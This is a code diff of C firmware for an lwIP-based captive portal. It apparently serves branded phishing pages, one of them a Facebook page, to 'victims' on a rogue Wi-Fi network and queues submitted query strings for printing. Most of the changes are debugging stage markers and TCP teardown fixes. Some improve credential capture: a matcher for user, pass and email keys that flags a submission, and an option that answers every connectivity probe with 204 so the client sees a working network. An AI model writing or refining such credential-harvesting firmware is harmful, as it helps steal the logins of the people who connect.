@@ -1,5 +1,7 @@
 #include "web_lwip.h"
-#include "petrel_http.h"   // pure predicates (host-tested in common/petrel_http_test.c)
+#include "sp_probe.h"
+#include "petrel_http.h"
+#include "lwip_log.h"   // pure predicates (host-tested in common/petrel_http_test.c)
 #include <lwip/tcp.h>
 #include <lwip/pbuf.h>
 #include <lwip/ip_addr.h>
@@ -32,6 +34,62 @@ static void (*web_render)(char*, size_t) = NULL;
 static void (*web_rotate)(void) = NULL;
 static web_resolve_fn web_resolve = NULL;
 static unsigned g_sends = 0;   // responses currently streaming (their body pointer must stay valid)
+
+// --- halt breadcrumbs (2026-10-28) ---------------------------------------------------------
+// The board sometimes stops dead mid-request with the heap flat, so a leak/OOM is ruled out and
+// the last thing it was doing is unknown. One relaxed store per stage (cheap, no allocation, no
+// UART from the tcpip thread) is read from loop() 1x/s: the last printed stage is where it died.
+// g_tick is bumped from a tcpip callback posted by loop(); if loop keeps printing but g_tick
+// stops, the tcpip thread is the one that died (and vice versa).
+volatile uint32_t g_sp_min = 0xFFFFFFFFu;
+volatile uint32_t g_sp_base = 0;
+volatile unsigned g_stage = 0;
+volatile unsigned g_reqs = 0;
+volatile unsigned g_tick = 0;
+// 0 = both lwIP pcb lists are empty after the teardown (bit0 active, bit1 time-wait)
+volatile unsigned g_pcb_state = 0;
+extern "C" { extern struct tcp_pcb *tcp_active_pcbs; extern struct tcp_pcb *tcp_tw_pcbs; }
+
+#define STAGE(n) __atomic_store_n(&g_stage, (unsigned)(n), __ATOMIC_RELAXED)
+
+static void web_tick_cb(void* arg) { (void)arg;
+    __atomic_store_n(&g_pcb_state,
+        (unsigned)((tcp_active_pcbs == NULL ? 1u : 0u) | (tcp_tw_pcbs == NULL ? 2u : 0u)),
+        __ATOMIC_RELAXED);
+    g_sp_base = sp_read();          // baseline: same task, shallowest frame
+    sp_note();
+    __atomic_add_fetch(&g_tick, 1u, __ATOMIC_RELAXED); }
+void web_lwip_diag_tick(void) { tcpip_callback_with_block(web_tick_cb, NULL, 0); }
+unsigned web_lwip_stage(void) { return __atomic_load_n(&g_stage, __ATOMIC_RELAXED); }
+unsigned web_lwip_reqs(void) { return __atomic_load_n(&g_reqs, __ATOMIC_RELAXED); }
+unsigned web_lwip_ticks(void) { return __atomic_load_n(&g_tick, __ATOMIC_RELAXED); }
+unsigned web_lwip_pcb_state(void) { return __atomic_load_n(&g_pcb_state, __ATOMIC_RELAXED); }
+
+// Case-insensitive scan of "key=value&..." pairs with no libc calls (see STEP C).
+static bool cred_query(const char* s) {
+    static const char* keys[] = {"user","pass","pwd","email","mail","login","name",
+                                 "username","password","userid","loginid"};
+    while (*s) {
+        const char* k = s;
+        const char* eq = NULL;
+        while (*s && *s != '&') { if (*s == '=' && !eq) eq = s; s++; }
+        if (eq && eq > k) {
+            size_t n = (size_t)(eq - k);
+            for (unsigned i = 0; i < sizeof(keys) / sizeof(keys[0]); i++) {
+                size_t j = 0;
+                while (j < n && keys[i][j]) {
+                    char a = k[j];
+                    if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
+                    if (a != keys[i][j]) break;
+                    j++;
+                }
+                if (j == n && keys[i][j] == 0) return true;
+            }
+        }
+        if (*s == '&') s++;
+    }
+    return false;
+}
 
 // One record per accepted connection: it owns the optional send cursor and is the single tcp_arg,
 // so tcp_err can always untrack even when no response has started yet. A stop aborts every record -
@@ -92,6 +150,8 @@ static void web_abort_conns(void) {
     web_apply_edits();
 }
 static bool web_portal = false;
+static bool web_probe_always204 = false;
+void web_lwip_set_probe204(bool on) { web_probe_always204 = on; }
 
 // Selected captive-portal page, set by web_lwip_start_portal(): the .ino resolves the chosen
 // portal (Default/brand-gzip/Custom) and hands the bytes here. body==NULL falls back to the
@@ -133,7 +193,7 @@ static void ip_mark_authed(uint32_t ip) {
 // SPSC: producer owns g_creds_tail, consumer owns g_creds_head; a DMB publishes the slot before the
 // index (volatile alone is not enough on this weakly-ordered part).
 #define CRED_SLOTS 4
-#define CRED_LEN   96
+#define CRED_LEN   80   // 2026-10-28: BSS is full; 80 still fits any real query string
 static char     g_creds[CRED_SLOTS][CRED_LEN];
 static unsigned g_creds_head = 0;   // consumer
 static unsigned g_creds_tail = 0;   // producer
@@ -155,7 +215,7 @@ static bool creds_push(const char* q) {
 // Per-connection send cursor for the (possibly large, e.g. 39KB facebook) portal body: the body
 // can exceed one tcp_sndbuf, so it is streamed across tcp_sent callbacks. Allocated in web_recv,
 // freed on completion, on tcp_err, and on peer FIN (a victim that drops mid-send must not leak it).
-struct web_send { const char* body; int len; int off; u8_t copy; void* conn; };
+struct web_send { const char* body; int len; int off; int acked; u8_t copy; void* conn; };
 
 // Shared scratch for the WebUI page and the cp.json body (the two never run at the same time:
 // WebUI mode and portal mode are mutually exclusive).
@@ -190,6 +250,7 @@ static err_t web_poll(void* arg, struct tcp_pcb* tpcb) {
 // tcp_close() can fail with ERR_MEM (it has to allocate a FIN). Retrying on the poll callback is the
 // documented pattern; if it fails again the connection is aborted rather than left dangling.
 static err_t web_poll_close(void* arg, struct tcp_pcb* tpcb) {
+    STAGE(15);
     (void)arg;
     if (tcp_close(tpcb) == ERR_OK) return ERR_OK;
     tcp_abort(tpcb);
@@ -197,7 +258,10 @@ static err_t web_poll_close(void* arg, struct tcp_pcb* tpcb) {
 }
 
 static void web_close(struct tcp_pcb* tpcb) {
-    if (tcp_close(tpcb) == ERR_OK) return;
+    STAGE(11);
+    // 2026-10-28: stage 11 is set BEFORE tcp_close(), so a halt at 11 cannot tell "inside
+    // tcp_close" from "after it". Record the return: 13 = ERR_OK, 14 = failed.
+    { err_t e = tcp_close(tpcb); STAGE(e == ERR_OK ? 13u : 14u); if (e == ERR_OK) return; }
     tcp_arg(tpcb, NULL);
     tcp_sent(tpcb, NULL);
     tcp_err(tpcb, NULL);
@@ -222,9 +286,18 @@ static int http_hdr(char* hdr, size_t bl, bool gzip) {
 // Release the send cursor + unhook callbacks, then close. Called once the whole body is queued,
 // and (with ws==NULL) for the small single-write responses that need no cursor.
 static void web_finish(struct tcp_pcb* tpcb, struct web_conn* c) {
+    STAGE(10);
     tcp_arg(tpcb, NULL);
+    // 2026-10-28: tcp_recv was left installed. The argument was cleared, so the next segment (or
+    // the peer's FIN) re-entered web_recv with arg==NULL, hit the p==NULL branch and closed the
+    // already-closing pcb a second time - the board went silent for good. Detach every callback.
+    tcp_recv(tpcb, NULL);
     tcp_sent(tpcb, NULL);
     tcp_err(tpcb, NULL);
+    // 2026-10-28: the 4 s abort poll stayed installed on a closing pcb, so it fired after the slot
+    // had been released and reset a connection that was closing cleanly (delayed TCP abort, ~4-8 s
+    // after the page was served). Drop it here; web_close() re-installs its own if close fails.
+    tcp_poll(tpcb, NULL, 0);
     conn_free(c);
     if (WEB_LOAD(&g_sends) == 0) web_apply_edits();
     web_close(tpcb);
@@ -233,7 +306,10 @@ static void web_finish(struct tcp_pcb* tpcb, struct web_conn* c) {
 // Queue as much of the remaining body as tcp_sndbuf allows; the tcp_sent callback resumes this
 // when the window drains. When the last byte is queued, close (lwIP flushes queued data before
 // the FIN). Zero-copy for flash gzip blobs; COPY for the mutable buffers.
+static err_t web_abort_done(struct tcp_pcb* tpcb, struct web_conn* c);
 static err_t web_send_body(struct tcp_pcb* tpcb, struct web_send* ws) {
+    sp_note();
+    STAGE(9);
     while (ws->off < ws->len) {
         u16_t room = tcp_sndbuf(tpcb);
         if (room == 0) { tcp_output(tpcb); return ERR_OK; }   // full: wait for tcp_sent
@@ -247,14 +323,36 @@ static err_t web_send_body(struct tcp_pcb* tpcb, struct web_send* ws) {
         ws->off += chunk;
     }
     tcp_output(tpcb);
-    web_finish(tpcb, (struct web_conn*)ws->conn);   // all bytes queued
+    // all bytes queued: wait for the ACKs, web_sent() aborts once they are all in
+    if (ws->acked >= ws->len) return web_abort_done(tpcb, (struct web_conn*)ws->conn);
     return ERR_OK;
 }
 
+// 2026-10-28: a graceful tcp_close() returned ERR_OK and the board still halted right after, so
+// the FIN/TIME_WAIT path is suspect. Keep the connection open until the peer has acknowledged
+// every body byte, then abort: the response is already delivered, and no FIN/close state is left.
+static err_t web_abort_done(struct tcp_pcb* tpcb, struct web_conn* c) {
+    STAGE(16);
+    tcp_arg(tpcb, NULL);
+    tcp_recv(tpcb, NULL);
+    tcp_sent(tpcb, NULL);
+    tcp_err(tpcb, NULL);
+    tcp_poll(tpcb, NULL, 0);
+    tcp_abort(tpcb);
+    STAGE(17);          // tcp_abort returned
+    conn_free(c);
+    STAGE(18);          // conn_free returned
+    return ERR_ABRT;
+}
+
 static err_t web_sent(void* arg, struct tcp_pcb* tpcb, u16_t len) {
-    (void)len;
+    STAGE(12);
     struct web_conn* c = (struct web_conn*)arg;
-    if (c && c->ws) return web_send_body(tpcb, c->ws);
+    if (c && c->ws) {
+        c->ws->acked += (int)len;
+        if (c->ws->off < c->ws->len) return web_send_body(tpcb, c->ws);
+        if (c->ws->acked >= c->ws->len) return web_abort_done(tpcb, c);
+    }
     return ERR_OK;
 }
 
@@ -281,6 +379,8 @@ static void web_resolve_now(void);
 
 static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err) {
     (void)err;
+    sp_note();
+    STAGE(2);
     struct web_conn* c = (struct web_conn*)arg;
     if (p == NULL) {                       // peer closed: free any in-flight cursor, then close
         web_finish(tpcb, c);
@@ -308,6 +408,8 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
         return ERR_OK;
     }
     char* req = c->req;
+    __atomic_add_fetch(&g_reqs, 1u, __ATOMIC_RELAXED);
+    STAGE(3);
 
     if (!web_portal) {
         // --- WebUI mode: serve the render() status page to any request ---
@@ -338,10 +440,13 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
     // authorize the client, and advance the portal rotation (if enabled).
     char* q = strchr(path, '?');
     if (q && strchr(q, '=')) {
-        creds_push(q + 1);                     // loop() drains + prints "EV:<query>"
-        // Only a credential-shaped query authorizes and rotates; an incidental tracking parameter
-        // must not clear the sign-in prompt for that client.
-        if (petrel_is_cred_submit(q + 1)) {
+        STAGE(4);
+        // EXPERIMENT 2026-10-28: the query branch is a no-op. Does the device still halt on a URL
+        // with ? and =? If yes the branch contents are irrelevant; if no, bisect the branch.
+        creds_push(q + 1);
+        // STEP C: libc-free predicate. The stock one calls strchr/strlen/memchr, which this build
+        // rewrites with -Wl,--wrap; a hand-rolled scan has no external calls at all.
+        if (cred_query(q + 1)) {
             ip_mark_authed(peer);
             authed = true;
             if (web_rotate) web_rotate();
@@ -349,6 +454,7 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
     }
 
     if (strncmp(path, "/cp.json", 8) == 0) {
+        STAGE(5);
         char* body = g_body;
         strcpy(body, "{\"captive\":");
         strcpy(body + strlen(body), authed ? "false" : "true");
@@ -363,7 +469,8 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
         return ERR_OK;
     }
     if (petrel_is_probe_path(path)) {
-        if (authed) {
+        STAGE(6);
+        if (authed || web_probe_always204) {
             // Windows NCSI/connecttest validate a BODY, not just a status: a bare 204 leaves the
             // warning up there. Everything else takes the empty 204.
             const char* body = NULL;
@@ -386,7 +493,9 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
     }
 
     // --- serve the SELECTED portal page (streamed: body may exceed one sndbuf) ---
-    if (WEB_LOAD(&g_sends) == 0) { web_apply_edits(); web_resolve_now(); }   // never mid-stream
+    STAGE(7);
+    if (WEB_LOAD(&g_sends) == 0) { web_apply_edits(); web_resolve_now(); }
+    STAGE(8);   // never mid-stream
     const char* body = g_portal_body ? g_portal_body : PORTAL_BODY;
     int len          = g_portal_body ? g_portal_len  : (int)(sizeof(PORTAL_BODY) - 1);
     bool gzip        = g_portal_body ? g_portal_gzip : false;
@@ -401,6 +510,7 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
     struct web_send* ws = (struct web_send*)mem_malloc(sizeof(struct web_send));
     if (!ws) { tcp_output(tpcb); web_finish(tpcb, c); return ERR_OK; }         // header only
     ws->body = body; ws->len = len; ws->off = 0; ws->copy = copy ? 1 : 0; ws->conn = c;
+    ws->acked = -hl;   // 2026-10-28: tcp_sent() also acks the header bytes queued above
     c->ws = ws;
     WEB_ADD(&g_sends, 1u);
     tcp_sent(tpcb, web_sent);
@@ -410,6 +520,7 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
 static err_t web_accept(void* arg, struct tcp_pcb* newpcb, err_t err) {
     (void)arg; (void)err;
     if (newpcb == NULL) return ERR_VAL;
+    STAGE(1);
     struct web_conn* c = conn_add(newpcb);
     if (!c) { tcp_abort(newpcb); return ERR_ABRT; }   // no slot: refuse rather than track nothing
     tcp_arg(newpcb, c);
